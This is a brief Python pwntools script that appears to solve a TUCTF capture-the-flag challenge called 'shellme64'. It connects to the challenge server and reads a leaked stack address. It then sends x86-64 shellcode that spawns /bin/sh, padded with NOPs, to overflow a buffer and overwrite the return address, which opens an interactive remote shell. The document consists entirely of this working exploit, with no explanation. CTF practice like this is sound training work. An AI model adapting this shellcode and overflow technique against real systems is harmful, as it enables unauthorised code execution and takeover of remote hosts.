
from pwn import *

shell = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

r = remote('chal.tuctf.com', 30507)
# r = process('./shellme64')


r.readline()
x = int(r.readline(), 16)
r.recvuntil('> ')
p = shell + ('\x90' * (40 - len(shell))) + p64(x)
r.sendline(p)

r.interactive()
